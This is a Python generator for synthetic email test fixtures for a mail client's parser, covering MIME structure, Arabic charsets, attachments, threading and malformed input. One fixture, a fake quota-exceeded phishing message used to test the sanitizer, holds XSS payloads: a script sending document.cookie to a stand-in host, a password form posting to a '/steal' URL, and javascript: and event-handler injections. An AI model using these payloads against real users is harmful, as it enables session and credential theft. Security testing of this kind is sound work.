#!/usr/bin/env python3
"""Generate the synthetic email fixture corpus and its conformance manifest.

    python3 fixtures/email/generate_synthetic.py            # (re)write fixtures + manifest
    python3 fixtures/email/generate_synthetic.py --check    # verify committed files are current

Every message here is invented (people, companies, numbers). Output is byte-for-byte
deterministic: fixed dates, IDs and boundaries; base64/quoted-printable via the stdlib;
images built without compression. scripts/tests/test_fixtures.py runs --check, so a
hand-edited synthetic fixture fails CI — change this generator instead.

Non-synthetic entries (anonymized real-world messages added with /email-fixture) are
preserved in manifest.json untouched.
"""

from __future__ import annotations

import argparse
import base64
import json
import quopri
import struct
import sys
import urllib.parse
import zlib
from pathlib import Path
from typing import Any, Dict, List

HERE = Path(__file__).resolve().parent
MANIFEST = HERE / "manifest.json"

# ---------------------------------------------------------------------------
# Encoding helpers (deterministic)
# ---------------------------------------------------------------------------


def b64(data: bytes) -> str:
    return base64.encodebytes(data).decode("ascii").rstrip("\n")


def b64_text(text: str, charset: str = "utf-8") -> str:
    """base64 for text parts: RFC 2045 canonical form (CRLF line breaks) before encoding."""
    return b64(text.replace("\r\n", "\n").replace("\n", "\r\n").encode(charset))


def qp(text: str, charset: str = "utf-8") -> str:
    return quopri.encodestring(text.encode(charset)).decode("ascii").rstrip("\n")


def _q_word_body(data: bytes) -> str:
    out = []
    for byte in data:
        ch = chr(byte)
        if ch == " ":
            out.append("_")
        elif byte < 128 and (ch.isalnum() or ch in "!*+-/"):
            out.append(ch)
        else:
            out.append("=%02X" % byte)
    return "".join(out)


def encoded_words(text: str, charset: str = "UTF-8", enc: str = "B", max_len: int = 75) -> str:
    """RFC 2047 encoded-words, split on character boundaries, folded onto continuation lines."""

    def render(chunk: str) -> str:
        data = chunk.encode(charset)
        body = base64.b64encode(data).decode("ascii") if enc == "B" else _q_word_body(data)
        return f"=?{charset}?{enc}?{body}?="

    words: List[str] = []
    current = ""
    for ch in text:
        if current and len(render(current + ch)) > max_len:
            words.append(render(current))
            current = ch
        else:
            current += ch
    if current:
        words.append(render(current))
    return "\n ".join(words)


def rfc2231(value: str) -> str:
    return "UTF-8''" + urllib.parse.quote(value.encode("utf-8"), safe="")


def tiny_png(rgb: tuple) -> bytes:
    """1x1 RGB PNG using a stored (uncompressed) deflate block: identical bytes on every platform."""

    def chunk(kind: bytes, data: bytes) -> bytes:
        return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF)

    raw = b"\x00" + bytes(rgb)
    stored = b"\x78\x01\x01" + struct.pack("<HH", len(raw), len(raw) ^ 0xFFFF) + raw + struct.pack(">I", zlib.adler32(raw) & 0xFFFFFFFF)
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", stored) + chunk(b"IEND", b"")


FAKE_PDF = b"%PDF-1.4\n% synthetic fixture - not a real document\n1 0 obj << /Type /Catalog >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n"
FAKE_ZIP = b"PK\x03\x04" + b"\x14\x00\x00\x00\x00\x00" + b"synthetic-office-document-placeholder" + b"\x00" * 16
FAKE_EXE = b"MZ" + b"\x90\x00" + b"synthetic fixture - not executable" + b"\x00" * 24


# ---------------------------------------------------------------------------
# Fixtures: (file, message text with \n line breaks, metadata incl. expectations)
# ---------------------------------------------------------------------------

FIXTURES: List[Dict[str, Any]] = []


def fixture(file: str, text: str, *, description: str, tags: List[str], expect: Dict[str, Any],
            seed: Dict[str, Any], line_endings: str = "crlf") -> None:
    FIXTURES.append({
        "file": file,
        "text": text,
        "meta": {
            "file": file,
            "origin": "synthetic",
            "line_endings": line_endings,
            "description": description,
            "tags": tags,
            "seed": seed,
            "expect": expect,
        },
    })


fixture("001-plain-text.eml", """\
Return-Path: <omar.farouk@isupply.test>
From: Omar Farouk <omar.farouk@isupply.test>
To: Sara Hassan <sara.hassan@isupply.test>
Subject: Weekly stock count reminder
Date: Mon, 12 Jan 2026 08:15:00 +0200
Message-ID: <20260112081500.001@isupply.test>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Hi Sara,

Please submit the weekly stock count for the Alexandria warehouse by
Thursday 3 PM.

Thanks,
Omar
""",
    description="Simplest possible message: single US-ASCII text/plain part.",
    tags=["basic", "text-plain"],
    seed={"folder": "Archive", "flags": ["\\Seen"]},
    expect={
        "subject": "Weekly stock count reminder",
        "from": [{"name": "Omar Farouk", "address": "omar.farouk@isupply.test"}],
        "to": ["sara.hassan@isupply.test"],
        "date": "2026-01-12T06:15:00+00:00",
        "message_id": "<20260112081500.001@isupply.test>",
        "body_preferred": "text/plain",
        "text_contains": ["weekly stock count", "Alexandria warehouse"],
        "attachments": [],
        "inline_parts": [],
    },
)

_plain_002 = (
    "Hi team,\n\n"
    "The new price list takes effect on 1 February — the “standard” tier rises by 4.5% "
    "(€12 → €12.54 per unit).\n\n"
    "Full details: https://intranet.isupply.test/pricing/2026-q1\n\nMona\n"
)
_html_002 = (
    '<html><body dir="auto"><p>Hi team,</p><p>The new price list takes effect on <strong>1 February</strong> '
    "— the “standard” tier rises by 4.5% (€12 → €12.54 per unit).</p>"
    '<p>Full details: <a href="https://intranet.isupply.test/pricing/2026-q1">intranet pricing page</a></p>'
    "<p>Mona</p></body></html>\n"
)
fixture("002-multipart-alternative-qp.eml", f"""\
From: "Mona Adel" <mona.adel@isupply.test>
To: Sales Team <sales@isupply.test>
Cc: Karim Nabil <karim.nabil@isupply.test>
Subject: Q1 pricing update {encoded_words(" ", "UTF-8", "Q")[:0]}=?UTF-8?Q?=E2=80=94_please_review?=
Date: Tue, 13 Jan 2026 10:30:00 +0200
Message-ID: <20260113103000.002@isupply.test>
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="b002-alt"

--b002-alt
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

{qp(_plain_002)}
--b002-alt
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

{qp(_html_002)}
--b002-alt--
""",
    description="text/plain + text/html alternative, UTF-8 quoted-printable with soft line breaks; "
                "subject mixes plain text and a Q encoded-word.",
    tags=["multipart-alternative", "quoted-printable", "rfc2047"],
    seed={"folder": "INBOX", "flags": ["\\Seen"]},
    expect={
        "subject": "Q1 pricing update — please review",
        "from": [{"name": "Mona Adel", "address": "mona.adel@isupply.test"}],
        "to": ["sales@isupply.test"],
        "cc": ["karim.nabil@isupply.test"],
        "body_preferred": "text/html",
        "text_contains": ["“standard”", "€12 → €12.54"],
        "html_contains": ["<strong>1 February</strong>"],
        "attachments": [],
        "html_dangerous_none": True,
        "remote_resources": 0,
    },
)

_body_003 = (
    "مرحباً عمر،\n\n"
    "مرفق ملخص المبيعات لشهر يناير 2026:\n"
    "- إجمالي المبيعات: 1,250,000 جنيه مصري\n"
    "- النمو مقارنة بديسمبر: 8%\n"
    "- رقم أمر الشراء: PO-2026-0117\n\n"
    "مع التحية،\nسارة\n"
)
_subject_003 = "تقرير المبيعات الشهري - يناير 2026"
fixture("003-arabic-rfc2047.eml", f"""\
From: {encoded_words("سارة حسن")} <sara.hassan@isupply.test>
To: {encoded_words("عمر فاروق")} <omar.farouk@isupply.test>
Subject: {encoded_words(_subject_003, max_len=60)}
Date: Sun, 01 Feb 2026 09:00:00 +0200
Message-ID: <20260201090000.003@isupply.test>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: base64

{b64_text(_body_003)}
""",
    description="Arabic (RTL) display names and a subject split across several B encoded-words "
                "(whitespace between adjacent encoded-words must be dropped); base64 UTF-8 body with "
                "mixed Arabic/Latin digits and identifiers (bidi).",
    tags=["arabic", "rtl", "bidi", "rfc2047", "base64"],
    seed={"folder": "Reports", "flags": []},
    expect={
        "subject": _subject_003,
        "from": [{"name": "سارة حسن", "address": "sara.hassan@isupply.test"}],
        "to": ["omar.farouk@isupply.test"],
        "date": "2026-02-01T07:00:00+00:00",
        "body_preferred": "text/plain",
        "text_contains": ["PO-2026-0117", "1,250,000", "ملخص المبيعات"],
        "attachments": [],
    },
)

_subject_004 = "عرض أسعار مستلزمات طبية"
_body_004 = (
    "السادة شركة آي سبلاي المحترمين،\n\n"
    "نرفق لكم عرض الأسعار المطلوب للمستلزمات الطبية. "
    "العرض صالح لمدة 30 يوماً من تاريخه.\n\n"
    "أحمد سمير\nمدير المبيعات\n"
)
fixture("004-windows-1256-legacy-charset.eml", f"""\
From: Ahmed Samir <ahmed.samir@example.com>
To: omar.farouk@isupply.test
Subject: {encoded_words(_subject_004, "windows-1256", "Q")}
Date: Mon, 02 Feb 2026 11:45:00 +0200
Message-ID: <a7f3c2e1.004@mail.example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset="windows-1256"
Content-Transfer-Encoding: quoted-printable

{qp(_body_004, "windows-1256")}
""",
    description="Arabic in the legacy windows-1256 charset (still common from older Outlook installs "
                "in Egypt): Q-encoded subject and quoted-printable body. Decoding as UTF-8 or Latin-1 "
                "produces mojibake.",
    tags=["arabic", "legacy-charset", "windows-1256", "quoted-printable", "rfc2047"],
    seed={"folder": "Reports", "flags": ["\\Seen"]},
    expect={
        "subject": _subject_004,
        "from": [{"name": "Ahmed Samir", "address": "ahmed.samir@example.com"}],
        "to": ["omar.farouk@isupply.test"],
        "body_preferred": "text/plain",
        "text_contains": ["صالح لمدة 30", "أحمد سمير"],
        "attachments": [],
    },
)

fixture("005-inline-image-cid.eml", f"""\
From: Karim Nabil <karim.nabil@isupply.test>
To: Sara Hassan <sara.hassan@isupply.test>
Subject: New letterhead preview
Date: Tue, 03 Feb 2026 14:05:00 +0200
Message-ID: <20260203140500.005@isupply.test>
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="b005-alt"

--b005-alt
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit

Hi Sara, here is the new letterhead with the 2026 logo.

--b005-alt
Content-Type: multipart/related; boundary="b005-rel"; type="text/html"

--b005-rel
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: 7bit

<html><body><p>Hi Sara, here is the new letterhead with the 2026 logo:</p><p><img src="cid:logo-2026@isupply.test" alt="iSupply logo" width="120" height="40"></p></body></html>

--b005-rel
Content-Type: image/png; name="logo.png"
Content-Transfer-Encoding: base64
Content-ID: <logo-2026@isupply.test>
Content-Disposition: inline; filename="logo.png"

{b64(tiny_png((0, 102, 204)))}
--b005-rel--

--b005-alt--
""",
    description="alternative(plain, related(html, png)): the image is referenced by cid: and must "
                "render inline — it is NOT an attachment even though it has a filename.",
    tags=["multipart-related", "inline-image", "cid"],
    seed={"folder": "INBOX", "flags": []},
    expect={
        "subject": "New letterhead preview",
        "body_preferred": "text/html",
        "html_contains": ['src="cid:logo-2026@isupply.test"'],
        "attachments": [],
        "inline_parts": ["logo-2026@isupply.test"],
        "remote_resources": 0,
    },
)

_name_pdf_006 = "فاتورة رقم 117.pdf"
_name_xlsx_006 = "قائمة الأسعار.xlsx"
_name_csv_006 = "stock-levels-alexandria-warehouse-2026-02-04-المخزون.csv"
_csv_006 = "sku,description,qty\nGLV-NIT-M,Nitrile gloves (M),1200\nSYR-5ML,Syringe 5 ml,8400\n"
_csv_split = "stock-levels-alexandria-warehouse-"
fixture("006-attachments-rfc2231.eml", f"""\
From: Mona Adel <mona.adel@isupply.test>
To: Accounts <accounts@isupply.test>
Subject: Invoice 117 and updated price list
Date: Wed, 04 Feb 2026 16:20:00 +0200
Message-ID: <20260204162000.006@isupply.test>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b006-mix"

--b006-mix
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit

Please find attached invoice 117, the updated price list and today's stock levels.

--b006-mix
Content-Type: application/pdf
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename*={rfc2231(_name_pdf_006)}

{b64(FAKE_PDF)}
--b006-mix
Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet;
 name="{encoded_words(_name_xlsx_006)}"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="{encoded_words(_name_xlsx_006)}"

{b64(FAKE_ZIP)}
--b006-mix
Content-Type: text/csv; charset=UTF-8
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
 filename*0*={rfc2231(_csv_split)};
 filename*1*={urllib.parse.quote(_name_csv_006[len(_csv_split):].encode("utf-8"), safe="")}

{b64_text(_csv_006)}
--b006-mix--
""",
    description="Three attachments with non-ASCII names: RFC 2231 extended filename, Outlook-style "
                "RFC 2047 encoded-word inside a quoted parameter (non-standard but common), and an "
                "RFC 2231 continuation (filename*0*/filename*1*).",
    tags=["attachments", "rfc2231", "rfc2047", "arabic"],
    seed={"folder": "INBOX", "flags": ["\\Flagged"]},
    expect={
        "subject": "Invoice 117 and updated price list",
        "body_preferred": "text/plain",
        "text_contains": ["invoice 117"],
        "attachments": [
            {"filename": _name_pdf_006, "content_type": "application/pdf", "size": len(FAKE_PDF)},
            {"filename": _name_xlsx_006, "content_type": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "size": len(FAKE_ZIP)},
            {"filename": _name_csv_006, "content_type": "text/csv", "size": len(_csv_006.replace("\n", "\r\n").encode("utf-8"))},
        ],
        "inline_parts": [],
    },
)

_html_007 = (
    '<html xmlns:o="urn:schemas-microsoft-com:office:office"><head><meta http-equiv="Content-Type" '
    'content="text/html; charset=us-ascii"><style><!-- p.MsoNormal {margin:0cm; font-size:11.0pt; '
    'font-family:"Calibri",sans-serif;} --></style></head><body lang="EN-US"><div class="WordSection1">'
    '<p class="MsoNormal">Hi Mona,<o:p></o:p></p><p class="MsoNormal">Attached is the signed supply agreement.'
    '<o:p></o:p></p><p class="MsoNormal"><img width="96" height="32" src="cid:image001.png@01DC7A2B.5E8F1C30" '
    'alt="iSupply"><o:p></o:p></p><p class="MsoNormal">Omar Farouk<br>Procurement | iSupply<o:p></o:p></p>'
    "</div></body></html>\n"
)
fixture("007-outlook-nested-structure.eml", f"""\
From: Omar Farouk <omar.farouk@isupply.test>
To: Mona Adel <mona.adel@isupply.test>
Subject: Signed supply agreement
Date: Thu, 05 Feb 2026 09:10:00 +0200
Message-ID: <DB9PR01MB0001.007@isupply.test>
X-Mailer: Synthetic Outlook-style generator
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b007-mix"

--b007-mix
Content-Type: multipart/related; boundary="b007-rel"; type="multipart/alternative"

--b007-rel
Content-Type: multipart/alternative; boundary="b007-alt"

--b007-alt
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit

Hi Mona,

Attached is the signed supply agreement.

Omar Farouk
Procurement | iSupply

--b007-alt
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

{qp(_html_007, "us-ascii")}
--b007-alt--

--b007-rel
Content-Type: image/png; name="image001.png"
Content-Description: image001.png
Content-Disposition: inline; filename="image001.png"
Content-ID: <image001.png@01DC7A2B.5E8F1C30>
Content-Transfer-Encoding: base64

{b64(tiny_png((204, 0, 51)))}
--b007-rel--

--b007-mix
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document;
 name="Supply Agreement 2026 (signed).docx"
Content-Description: Supply Agreement 2026 (signed).docx
Content-Disposition: attachment; filename="Supply Agreement 2026 (signed).docx"
Content-Transfer-Encoding: base64

{b64(FAKE_ZIP)}
--b007-mix--
""",
    description="Outlook-style mixed(related(alternative(plain, html), png), docx): signature image "
                "inline via cid, real attachment beside it, Word HTML with conditional comments.",
    tags=["outlook", "nested-multipart", "inline-image", "attachments"],
    seed={"folder": "INBOX", "flags": ["\\Seen", "\\Answered"]},
    expect={
        "subject": "Signed supply agreement",
        "body_preferred": "text/html",
        "text_contains": ["signed supply agreement"],
        "html_contains": ["cid:image001.png@01DC7A2B.5E8F1C30"],
        "attachments": [{"filename": "Supply Agreement 2026 (signed).docx",
                         "content_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document"}],
        "inline_parts": ["image001.png@01DC7A2B.5E8F1C30"],
    },
)

fixture("008-thread-original.eml", """\
From: Karim Nabil <karim.nabil@isupply.test>
To: Logistics <logistics@isupply.test>
Subject: Delivery schedule for Cairo branch
Date: Mon, 09 Feb 2026 08:00:00 +0200
Message-ID: <thread-cairo-1@isupply.test>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit

Team,

Can we confirm the delivery schedule for the Cairo branch next week?
Proposed: Tuesday and Thursday mornings.

Karim
""",
    description="Thread root (see manifest.threads).",
    tags=["threading"],
    seed={"folder": "INBOX", "flags": ["\\Seen"]},
    expect={
        "subject": "Delivery schedule for Cairo branch",
        "message_id": "<thread-cairo-1@isupply.test>",
        "in_reply_to": None,
        "references": [],
    },
)

fixture("009-thread-reply.eml", """\
From: Mona Adel <mona.adel@isupply.test>
To: Karim Nabil <karim.nabil@isupply.test>
Cc: Logistics <logistics@isupply.test>
Subject: RE: Delivery schedule for Cairo branch
Date: Mon, 09 Feb 2026 09:30:00 +0200
Message-ID: <thread-cairo-2@isupply.test>
In-Reply-To: <thread-cairo-1@isupply.test>
References: <thread-cairo-1@isupply.test>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit

Tuesday works. Thursday we need an afternoon slot.

Mona

-----Original Message-----
From: Karim Nabil <karim.nabil@isupply.test>
Sent: Monday, February 9, 2026 8:00 AM
To: Logistics <logistics@isupply.test>
Subject: Delivery schedule for Cairo branch

Team,

Can we confirm the delivery schedule for the Cairo branch next week?
Proposed: Tuesday and Thursday mornings.

Karim
""",
    description="Reply with Outlook-style quoted original (no '>' markers): quote folding must detect "
                "the '-----Original Message-----' block.",
    tags=["threading", "quoted-text"],
    seed={"folder": "INBOX", "flags": ["\\Seen"]},
    expect={
        "normalized_subject": "Delivery schedule for Cairo branch",
        "in_reply_to": "<thread-cairo-1@isupply.test>",
        "references": ["<thread-cairo-1@isupply.test>"],
        "text_contains": ["-----Original Message-----"],
    },
)

_subject_010 = "رد: RE: Delivery schedule for Cairo branch"
_body_010 = "تمام، سأبلغ فريق المخزن.\n\n> Tuesday works. Thursday we need an afternoon slot.\n"
fixture("010-thread-reply-arabic-prefix.eml", f"""\
From: {encoded_words("سارة حسن")} <sara.hassan@isupply.test>
To: Mona Adel <mona.adel@isupply.test>
Subject: {encoded_words(_subject_010)}
Date: Mon, 09 Feb 2026 10:15:00 +0200
Message-ID: <thread-cairo-3@isupply.test>
In-Reply-To: <thread-cairo-2@isupply.test>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: base64

{b64_text(_body_010)}
""",
    description="Reply from a client that sets In-Reply-To but omits References, with the Arabic "
                "Outlook reply prefix 'رد:' stacked on 'RE:'. Threading must still attach it.",
    tags=["threading", "arabic", "broken-references"],
    seed={"folder": "INBOX", "flags": []},
    expect={
        "subject": _subject_010,
        "normalized_subject": "Delivery schedule for Cairo branch",
        "in_reply_to": "<thread-cairo-2@isupply.test>",
        "references": [],
    },
)

_html_011 = """\
<html><head>
<meta http-equiv="refresh" content="0;url=https://isupply-support.example/login">
<base href="https://isupply-support.example/">
<style>body { background: url(javascript:alert(1)); } .x { width: expression(alert(2)); } @import url(https://isupply-support.example/track.css);</style>
<script>fetch('https://isupply-support.example/c?'+document.cookie)</script>
</head><body onload="alert(3)">
<p>Your mailbox is <b>over quota</b>.</p>
<p><a href="javascript:alert(4)">Click here</a> or visit <a href="https://isupply-support.example/login">https://mail.isupply.test/quota</a>.</p>
<img src="x" onerror="alert(5)">
<iframe src="https://isupply-support.example/frame" srcdoc="<script>alert(6)</script>"></iframe>
<object data="https://isupply-support.example/x.swf"></object>
<embed src="https://isupply-support.example/x.swf">
<form action="https://isupply-support.example/steal" method="post"><input name="password" type="password"><button>Keep my mailbox</button></form>
<svg onload="alert(7)"><circle r="1"/></svg>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCg4KTwvc2NyaXB0Pg==">open</a>
<a href=" JaVaScRiPt:alert(9)">obfuscated</a>
</body></html>
"""
fixture("011-html-xss-payloads.eml", f"""\
From: "IT Helpdesk" <helpdesk@isupply-support.example>
To: sara.hassan@isupply.test
Subject: Action required: mailbox quota exceeded
Date: Tue, 10 Feb 2026 07:45:00 +0200
Message-ID: <x011@isupply-support.example>
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="b011-alt"

--b011-alt
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit

Your mailbox is over quota. Visit the link to keep receiving mail.

--b011-alt
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

{qp(_html_011)}
--b011-alt--
""",
    description="Phishing-style HTML packed with active content: script, event handlers, javascript:/data: "
                "URLs (incl. obfuscated case/whitespace), iframe+srcdoc, object/embed, form, meta refresh, "
                "base, CSS expression/@import, SVG, and a link whose text shows a different host. "
                "SECURITY CONFORMANCE: after sanitization none of html_dangerous_at_least may remain.",
    tags=["security", "xss", "phishing", "html"],
    seed={"folder": "Junk", "flags": []},
    expect={
        "subject": "Action required: mailbox quota exceeded",
        "body_preferred": "text/html",
        "html_dangerous_at_least": ["base_tag", "css_expression", "css_import", "data_html_url", "event_handler",
                                    "form", "iframe", "javascript_url", "meta_refresh", "object_embed", "script",
                                    "srcdoc", "svg"],
        "mismatched_links_min": 1,
    },
)

_html_012 = """\
<html><head><link rel="stylesheet" href="https://cdn.medsupply.example/n.css"></head>
<body><table background="https://cdn.medsupply.example/bg.jpg" width="600"><tr><td>
<img src="https://cdn.medsupply.example/hero.jpg" width="600" alt="20% off nitrile gloves">
<p>This week only: 20% off nitrile gloves.</p>
<p><a href="https://news.medsupply.example/c?u=https%3A%2F%2Fshop.medsupply.example%2Fgloves&amp;utm_source=newsletter">Shop now</a></p>
<div style="background:url(https://cdn.medsupply.example/banner.png)">Free delivery in Alexandria</div>
<img src="https://t.medsupply.example/open?id=abc123" width="1" height="1" alt="">
</td></tr></table></body></html>
"""
fixture("012-remote-images-tracking-pixel.eml", f"""\
From: MedSupply Weekly <newsletter@news.medsupply.example>
To: omar.farouk@isupply.test
Subject: This week: 20% off nitrile gloves
Date: Wed, 11 Feb 2026 06:00:00 +0000
Message-ID: <nl-2026-07.012@news.medsupply.example>
List-Unsubscribe: <https://news.medsupply.example/u/abc123>, <mailto:unsubscribe@news.medsupply.example>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="b012-alt"

--b012-alt
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit

This week only: 20% off nitrile gloves. Shop: https://shop.medsupply.example/gloves

--b012-alt
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

{qp(_html_012)}
--b012-alt--
""",
    description="Marketing newsletter: remote stylesheet, table background, remote images, CSS url(), "
                "a 1x1 open-tracking pixel and RFC 8058 one-click unsubscribe. PRIVACY CONFORMANCE: no "
                "remote resource may load before the user opts in.",
    tags=["privacy", "remote-content", "tracking-pixel", "newsletter", "list-unsubscribe"],
    seed={"folder": "INBOX", "flags": []},
    expect={
        "subject": "This week: 20% off nitrile gloves",
        "body_preferred": "text/html",
        "remote_resources": 5,
        "tracking_pixels": 1,
        "html_dangerous_none": True,
    },
)

_ics_013 = """\
BEGIN:VCALENDAR
PRODID:-//iSupply//Synthetic Fixture//EN
VERSION:2.0
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:Africa/Cairo
BEGIN:STANDARD
DTSTART:19700101T000000
TZOFFSETFROM:+0200
TZOFFSETTO:+0200
TZNAME:EET
END:STANDARD
END:VTIMEZONE
BEGIN:VEVENT
UID:20260212T090000Z-013@isupply.test
DTSTAMP:20260205T120000Z
DTSTART;TZID=Africa/Cairo:20260212T110000
DTEND;TZID=Africa/Cairo:20260212T120000
SUMMARY:Monthly inventory review
LOCATION:Alexandria HQ - Meeting room 2
ORGANIZER;CN=Mona Adel:mailto:mona.adel@isupply.test
ATTENDEE;CN=Omar Farouk;ROLE=REQ-PARTICIPANT;PARTSTAT=NEEDS-ACTION;RSVP=TRU
 E:mailto:omar.farouk@isupply.test
SEQUENCE:0
STATUS:CONFIRMED
END:VEVENT
END:VCALENDAR"""
fixture("013-calendar-invite.eml", f"""\
From: Mona Adel <mona.adel@isupply.test>
To: Omar Farouk <omar.farouk@isupply.test>
Subject: Invitation: Monthly inventory review @ Thu 12 Feb 2026 11:00 (EET)
Date: Thu, 05 Feb 2026 14:00:00 +0200
Message-ID: <20260205140000.013@isupply.test>
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="b013-alt"

--b013-alt
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 7bit

Monthly inventory review
Thu 12 Feb 2026, 11:00-12:00 (Africa/Cairo)
Alexandria HQ - Meeting room 2

--b013-alt
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: 7bit

<html><body><h3>Monthly inventory review</h3><p>Thu 12 Feb 2026, 11:00&ndash;12:00 (Africa/Cairo)<br>Alexandria HQ - Meeting room 2</p></body></html>

--b013-alt
Content-Type: text/calendar; charset=UTF-8; method=REQUEST
Content-Transfer-Encoding: 7bit

{_ics_013}
--b013-alt--
""",
    description="iTIP meeting request: alternative(plain, html, text/calendar;method=REQUEST) with a "
                "folded ATTENDEE line and TZID-relative times (simplified VTIMEZONE).",
    tags=["calendar", "itip", "icalendar", "timezone"],
    seed={"folder": "INBOX", "flags": []},
    expect={
        "subject": "Invitation: Monthly inventory review @ Thu 12 Feb 2026 11:00 (EET)",
        "body_preferred": "text/html",
        "calendar": {"method": "REQUEST", "summary": "Monthly inventory review"},
        "attachments": [],
    },
)

fixture("014-malformed-missing-boundary.eml", f"""\
From: Karim Nabil <karim.nabil@isupply.test>
To: Omar Farouk <omar.farouk@isupply.test>
Subject: Scanned delivery note
Date: Fri, 06 Feb 2026 12:30:00 +0200
Message-ID: <20260206123000.014@isupply.test>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b014-mix"

This is a multi-part message in MIME format.

--b014-mix

Delivery note for order 4471 attached (this part has no headers, so it is text/plain us-ascii).

--b014-mix
Content-Type: application/pdf; name="delivery-note-4471.pdf"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="delivery-note-4471.pdf"

{b64(FAKE_PDF)}
""",
    description="Broken multipart: preamble text, a part with no headers (defaults to text/plain), and "
                "no closing boundary. Parsers must recover both parts and report a defect.",
    tags=["malformed", "robustness", "attachments"],
    seed={"folder": "INBOX", "flags": ["\\Seen"]},
    expect={
        "subject": "Scanned delivery note",
        "body_preferred": "text/plain",
        "text_contains": ["Delivery note for order 4471"],
        "attachments": [{"filename": "delivery-note-4471.pdf", "content_type": "application/pdf"}],
        "defects_include": ["CloseBoundaryNotFoundDefect"],
    },
)

fixture("015-lf-line-endings.eml", """\
From: Sara Hassan <sara.hassan@isupply.test>
To: Karim Nabil <karim.nabil@isupply.test>
Subject: Saved by a Unix tool (LF line endings)
Date: Fri, 06 Feb 2026 15:00:00 +0200
Message-ID: <20260206150000.015@isupply.test>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

This message uses bare LF line endings, as written by many Unix tools and some
export features. Parsers must accept it; our client must never send it.
""",
    description="Bare-LF line endings (not RFC 5322 canonical form). Accept on input; always emit CRLF.",
    tags=["robustness", "line-endings"],
    seed={"folder": "INBOX", "flags": ["\\Seen"]},
    line_endings="lf",
    expect={
        "subject": "Saved by a Unix tool (LF line endings)",
        "text_contains": ["bare LF line endings"],
    },
)

fixture("016-unusual-headers.eml", """\
from: Omar Farouk <omar.farouk@isupply.test>
to: undisclosed-recipients:;
subject: A very long subject line that was folded by the sending client because it
 exceeded the recommended line length of seventy-eight characters
 (RFC 5322 section 2.1.1)
message-id: <20260207080000.016@isupply.test>
mime-version: 1.0
content-type: text/plain; charset=us-ascii

No Date header, lowercase header names, an empty group address and a subject folded
across three lines. Clients must unfold, fall back to the server INTERNALDATE for
sorting, and show an empty recipient list without crashing.
""",
    description="Lower-case header names, folded Subject over three lines, empty group 'undisclosed-recipients:;', "
                "missing Date (use IMAP INTERNALDATE).",
    tags=["robustness", "headers", "folding"],
    seed={"folder": "INBOX", "flags": []},
    expect={
        "subject": "A very long subject line that was folded by the sending client because it exceeded the "
                   "recommended line length of seventy-eight characters (RFC 5322 section 2.1.1)",
        "to": [],
        "date": None,
        "message_id": "<20260207080000.016@isupply.test>",
    },
)

fixture("017-utf8-raw-headers-rfc6532.eml", """\
From: سارة حسن <sara.hassan@isupply.test>
To: عمر فاروق <omar.farouk@isupply.test>
Subject: تأكيد الطلب رقم 5521 ✅
Date: Sat, 07 Feb 2026 10:00:00 +0200
Message-ID: <20260207100000.017@isupply.test>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

تم تأكيد الطلب رقم 5521 وسيتم الشحن غداً.
Order 5521 is confirmed and ships tomorrow. \U0001F4E6
""",
    description="RFC 6532 internationalized headers: raw UTF-8 (unencoded) display names and subject, "
                "emoji outside the BMP, 8bit body.",
    tags=["rfc6532", "utf8-headers", "arabic", "emoji", "8bit"],
    seed={"folder": "INBOX", "flags": []},
    expect={
        "subject": "تأكيد الطلب رقم 5521 ✅",
        "from": [{"name": "سارة حسن", "address": "sara.hassan@isupply.test"}],
        "text_contains": ["Order 5521 is confirmed", "\U0001F4E6"],
    },
)

fixture("018-forwarded-as-attachment.eml", """\
From: Omar Farouk <omar.farouk@isupply.test>
To: Sara Hassan <sara.hassan@isupply.test>
